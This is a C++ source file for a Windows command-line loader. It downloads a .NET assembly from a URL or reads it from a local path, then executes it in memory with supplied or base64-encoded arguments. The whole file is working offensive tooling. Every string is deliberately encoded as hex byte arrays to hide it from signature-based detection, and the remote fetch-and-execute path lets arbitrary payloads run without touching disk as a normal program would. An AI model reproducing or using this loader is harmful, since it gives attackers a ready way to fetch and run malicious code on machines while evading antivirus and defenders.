#include <Windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <string>

#include "Base64.h"
#include "DotnetExecute.h"
#include "Http.h"
#include "LocalFileReaderA.h"

// All runtime strings are now stored as arrays of character codes.

// print_usage strings
static const char s_usage1[] = { 0x55,0x73,0x61,0x67,0x65,0x3A,0x0A,0x00 }; // "Usage:\n"

static const char s_usage2[] = {
    0x20,0x20,0x25,0x73,0x20,0x2D,0x70,0x61,0x74,0x68,0x20,
    0x3C,0x6C,0x6F,0x63,0x61,0x74,0x69,0x6F,0x6E,0x3E,0x20,
    0x2D,0x61,0x20,
    0x3C,0x63,0x6C,0x65,0x61,0x72,0x74,0x65,0x78,0x74,0x20,0x61,0x72,0x67,0x75,0x6D,0x65,0x6E,0x74,0x73,0x3E,0x0A,0x00
};

static const char s_usage3[] = {
    0x20,0x20,0x25,0x73,0x20,0x2D,0x70,0x61,0x74,0x68,0x20,
    0x3C,0x6C,0x6F,0x63,0x61,0x74,0x69,0x6F,0x6E,0x3E,0x20,
    0x2D,0x62,0x36,0x34,0x20,
    0x3C,0x62,0x61,0x73,0x65,0x36,0x34,0x20,0x65,0x6E,0x63,0x6F,0x64,0x65,0x64,0x20,
    0x61,0x72,0x67,0x75,0x6D,0x65,0x6E,0x74,0x73,0x3E,0x0A,0x00
};

static const char s_usage4[] = { 0x0A,0x4F,0x70,0x74,0x69,0x6F,0x6E,0x73,0x3A,0x0A,0x00 }; // "\nOptions:\n"

static const char s_usage5[] = {
    0x20,0x20,0x2D,0x70,0x61,0x74,0x68,0x20,0x20,0x20,0x20,
    0x53,0x70,0x65,0x63,0x69,0x66,0x79,0x20,0x74,0x68,0x65,0x20,0x6C,0x6F,0x63,0x61,
    0x74,0x69,0x6F,0x6E,0x20,0x6F,0x66,0x20,0x74,0x68,0x65,0x20,0x61,0x73,0x73,0x65,
    0x6D,0x62,0x6C,0x79,0x2E,0x20,0x49,0x66,0x20,0x74,0x68,0x65,0x20,0x70,0x61,0x74,
    0x68,0x20,0x62,0x65,0x67,0x69,0x6E,0x73,0x20,0x77,0x69,0x74,0x68,0x20,
    0x22,     // double quote character (0x22)
    0x68,0x74,0x74,0x70,
    0x22,     // double quote character (0x22)
    0x2C,0x0A,0x00
};

static const char s_usage6[] = {
    0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20, // 11 spaces
    0x61,0x6E,0x20,
    0x48,0x54,0x54,0x50,0x20,
    0x72,0x65,0x71,0x75,0x65,0x73,0x74,0x20,
    0x69,0x73,0x20,
    0x6D,0x61,0x64,0x65,0x3B,0x20,
    0x6F,0x74,0x68,0x65,0x72,0x77,0x69,0x73,0x65,0x2C,0x20,
    0x69,0x74,0x20,
    0x69,0x73,0x20,
    0x74,0x72,0x65,0x61,0x74,0x65,0x64,0x20,
    0x61,0x73,0x20,
    0x61,0x20,
    0x6C,0x6F,0x63,0x61,0x6C,0x20,
    0x66,0x69,0x6C,0x65,0x2E,0x0A,0x00
};

static const char s_usage7[] = {
    0x20,0x20,0x2D,0x61,0x20,
    0x20,0x20,0x20,0x20,0x20,0x20, // 7 spaces
    0x50,0x72,0x6F,0x76,0x69,0x64,0x65,0x20,
    0x63,0x6C,0x65,0x61,0x72,0x74,0x65,0x78,0x74,0x20,
    0x61,0x72,0x67,0x75,0x6D,0x65,0x6E,0x74,0x73,0x20,
    0x66,0x6F,0x72,0x20,
    0x44,0x6F,0x74,0x6E,0x65,0x74,0x45,0x78,0x65,0x63,0x75,0x74,0x65,0x2E,0x0A,0x00
};

static const char s_usage8[] = {
    0x20,0x20,0x2D,0x62,0x36,0x34,0x20,
    0x20,0x20,0x20,0x20, // 5 spaces
    0x50,0x72,0x6F,0x76,0x69,0x64,0x65,0x20,
    0x62,0x61,0x73,0x65,0x36,0x34,0x20,
    0x65,0x6E,0x63,0x6F,0x64,0x65,0x64,0x20,
    0x61,0x72,0x67,0x75,0x6D,0x65,0x6E,0x74,0x73,0x20,
    0x66,0x6F,0x72,0x20,
    0x44,0x6F,0x74,0x6E,0x65,0x74,0x45,0x78,0x65,0x63,0x75,0x74,0x65,0x2E,0x0A,0x00
};

// Error messages in main.
static const char s_err_read_url[] = {
    0x5B,0x2D,0x5D,0x20,0x52,0x65,0x61,0x64,0x46,0x69,0x6C,0x65,0x46,0x72,0x6F,0x6D,
    0x55,0x52,0x4C,0x41,0x20,0x66,0x61,0x69,0x6C,0x65,0x64,0x20,0x66,0x6F,0x72,0x20,
    0x55,0x52,0x4C,0x3A,0x20,0x25,0x73,0x0A,0x00
};

static const char s_err_read_local[] = {
    0x5B,0x2D,0x5D,0x20,0x52,0x65,0x61,0x64,0x4C,0x6F,0x63,0x61,0x6C,0x46,0x69,0x6C,
    0x65,0x41,0x20,0x66,0x61,0x69,0x6C,0x65,0x64,0x20,0x66,0x6F,0x72,0x20,0x66,0x69,
    0x6C,0x65,0x3A,0x20,0x25,0x73,0x0A,0x00
};

static const char s_err_mb_to_wc_len[] = {
    0x5B,0x2D,0x5D,0x20,0x4D,0x75,0x6C,0x74,0x69,0x42,0x79,0x74,0x65,0x54,0x6F,0x57,
    0x69,0x64,0x65,0x43,0x68,0x61,0x72,0x20,0x66,0x61,0x69,0x6C,0x65,0x64,0x20,0x74,
    0x6F,0x20,0x67,0x65,0x74,0x20,0x6C,0x65,0x6E,0x67,0x74,0x68,0x2E,0x0A,0x00
};

static const char s_err_heap_alloc_wc[] = {
    0x5B,0x2D,0x5D,0x20,0x48,0x65,0x61,0x70,0x41,0x6C,0x6C,0x6F,0x63,0x20,0x66,0x61,
    0x69,0x6C,0x65,0x64,0x20,0x66,0x6F,0x72,0x20,0x77,0x69,0x64,0x65,0x20,0x63,0x68,
    0x61,0x72,0x20,0x61,0x72,0x67,0x75,0x6D,0x65,0x6E,0x74,0x73,0x2E,0x0A,0x00
};

static const char s_err_mb_to_wc_conv[] = {
    0x5B,0x2D,0x5D,0x20,0x4D,0x75,0x6C,0x74,0x69,0x42,0x79,0x74,0x65,0x54,0x6F,0x57,
    0x69,0x64,0x65,0x43,0x68,0x61,0x72,0x20,0x63,0x6F,0x6E,0x76,0x65,0x72,0x73,0x69,
    0x6F,0x6E,0x20,0x66,0x61,0x69,0x6C,0x65,0x64,0x2E,0x0A,0x00
};

static const char s_err_heap_alloc_args[] = {
    0x5B,0x2D,0x5D,0x20,0x48,0x65,0x61,0x70,0x41,0x6C,0x6C,0x6F,0x63,0x20,0x66,0x61,
    0x69,0x6C,0x65,0x64,0x20,0x66,0x6F,0x72,0x20,0x61,0x72,0x67,0x75,0x6D,0x65,0x6E,
    0x74,0x73,0x2E,0x0A,0x00
};

static const char s_err_mbstowcs[] = {
    0x5B,0x2D,0x5D,0x20,0x6D,0x62,0x73,0x74,0x6F,0x77,0x63,0x73,0x5F,0x73,0x20,
    0x66,0x61,0x69,0x6C,0x65,0x64,0x20,0x6F,0x6E,0x20,0x61,0x72,0x67,0x75,0x6D,0x65,
    0x6E,0x74,0x20,0x25,0x64,0x2E,0x0A,0x00
};

static const char s_err_heap_alloc_empty[] = {
    0x5B,0x2D,0x5D,0x20,0x48,0x65,0x61,0x70,0x41,0x6C,0x6C,0x6F,0x63,0x20,0x66,0x61,
    0x69,0x6C,0x65,0x64,0x20,0x66,0x6F,0x72,0x20,0x65,0x6D,0x70,0x74,0x79,0x20,0x61,
    0x72,0x67,0x75,0x6D,0x65,0x6E,0x74,0x73,0x2E,0x0A,0x00
};

static const char s_err_dotnet[] = {
    0x5B,0x2D,0x5D,0x20,0x44,0x6F,0x74,0x6E,0x65,0x74,0x45,0x78,0x65,0x63,0x75,0x74,
    0x65,0x20,0x46,0x61,0x69,0x6C,0x65,0x64,0x00
};

static const char s_output[] = { 0x0A,0x0A,0x25,0x73,0x00 }; // "\n\n%s"

// Additional flags and text.
static const char s_http[] = { 0x68,0x74,0x74,0x70,0x00 }; // "http"
static const char s_path_flag[] = { 0x2D,0x70,0x61,0x74,0x68,0x00 }; // "-path"
static const char s_b64_flag[] = { 0x2D,0x62,0x36,0x34,0x00 }; // "-b64"
static const char s_a_flag[] = { 0x2D,0x61,0x00 }; // "-a"

// Wide-character strings.
static const WCHAR s_myappdomain[] = { 0x004D,0x0079,0x0041,0x0070,0x0070,0x0044,0x006F,0x006D,0x0061,0x0069,0x006E,0x0000 }; // "MyAppDomain"
static const WCHAR s_space[] = { 0x0020,0x0000 }; // " "

void print_usage(const char* progname) {
    printf("%s", s_usage1);
    printf(s_usage2, progname);
    printf(s_usage3, progname);
    printf("%s", s_usage4);
    printf("%s", s_usage5);
    printf("%s", s_usage6);
    printf("%s", s_usage7);
    printf("%s", s_usage8);
}

int main(int argc, char* argv[]) {
    PBYTE AssemblyBytes = NULL;
    DWORD AssemblySize = 0;
    LPSTR OutputBuffer = NULL;
    ULONG OutputLength = 0;
    PWSTR arguments = NULL;

    // At a minimum, require: -path <location> and an arguments flag.
    if (argc < 3) {
        print_usage(argv[0]);
        return 1;
    }

    // Process the location flag.
    if (strcmp(argv[1], s_path_flag) != 0) {
        print_usage(argv[0]);
        return 1;
    }

    LPCSTR location = argv[2];
    BOOL isHTTP = (_strnicmp(location, s_http, 4) == 0);

    if (isHTTP) {
        if (!ReadFileFromURLA(location, &AssemblyBytes, &AssemblySize)) {
            printf(s_err_read_url, location);
            return 1;
        }
    }
    else {
        if (!ReadLocalFileA(location, &AssemblyBytes, &AssemblySize)) {
            printf(s_err_read_local, location);
            return 1;
        }
    }

    // Process the arguments flag.
    if (argc > 3) {
        if (strcmp(argv[3], s_b64_flag) == 0) {
            if (argc < 5) {
                print_usage(argv[0]);
                HeapFree(GetProcessHeap(), 0, AssemblyBytes);
                return 1;
            }
            std::string decodedStr = base64_decode(argv[4], false);
            int wideCharLen = MultiByteToWideChar(CP_ACP, 0, decodedStr.c_str(), -1, NULL, 0);
            if (wideCharLen == 0) {
                printf(s_err_mb_to_wc_len);
                HeapFree(GetProcessHeap(), 0, AssemblyBytes);
                return 1;
            }
            arguments = (PWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, wideCharLen * sizeof(WCHAR));
            if (!arguments) {
                printf(s_err_heap_alloc_wc);
                HeapFree(GetProcessHeap(), 0, AssemblyBytes);
                return 1;
            }
            if (MultiByteToWideChar(CP_ACP, 0, decodedStr.c_str(), -1, arguments, wideCharLen) == 0) {
                printf(s_err_mb_to_wc_conv);
                HeapFree(GetProcessHeap(), 0, arguments);
                HeapFree(GetProcessHeap(), 0, AssemblyBytes);
                return 1;
            }
        }
        else if (strcmp(argv[3], s_a_flag) == 0) {
            if (argc < 5) {
                print_usage(argv[0]);
                HeapFree(GetProcessHeap(), 0, AssemblyBytes);
                return 1;
            }
            // Concatenate all cleartext arguments from argv[4] onward.
            size_t totalLen = 0;
            for (int i = 4; i < argc; i++) {
                totalLen += strlen(argv[i]) + 1;
            }
            arguments = (PWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, totalLen * sizeof(WCHAR));
            if (!arguments) {
                printf(s_err_heap_alloc_args);
                HeapFree(GetProcessHeap(), 0, AssemblyBytes);
                return 1;
            }
            arguments[0] = L'\0';
            for (int i = 4; i < argc; i++) {
                size_t currentLen = wcslen(arguments);
                size_t convertedChars = 0;
                if (mbstowcs_s(&convertedChars, arguments + currentLen, totalLen - currentLen, argv[i], _TRUNCATE) != 0) {
                    printf(s_err_mbstowcs, i);
                    HeapFree(GetProcessHeap(), 0, arguments);
                    HeapFree(GetProcessHeap(), 0, AssemblyBytes);
                    return 1;
                }
                if (i < argc - 1) {
                    wcscat_s(arguments, totalLen, s_space);
                }
            }
        }
        else {
            print_usage(argv[0]);
            HeapFree(GetProcessHeap(), 0, AssemblyBytes);
            return 1;
        }
    }
    else {
        arguments = (PWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(WCHAR));
        if (!arguments) {
            printf(s_err_heap_alloc_empty);
            HeapFree(GetProcessHeap(), 0, AssemblyBytes);
            return 1;
        }
        arguments[0] = L'\0';
    }

    // Execute the .NET assembly.
    if (DotnetExecute(AssemblyBytes, AssemblySize, (PWSTR)s_myappdomain, arguments, &OutputBuffer, &OutputLength)) {
        puts(s_err_dotnet);
    }
    else {
        printf(s_output, OutputBuffer);
    }

    HeapFree(GetProcessHeap(), 0, AssemblyBytes);
    HeapFree(GetProcessHeap(), 0, OutputBuffer);
    HeapFree(GetProcessHeap(), 0, arguments);
    return 0;
}
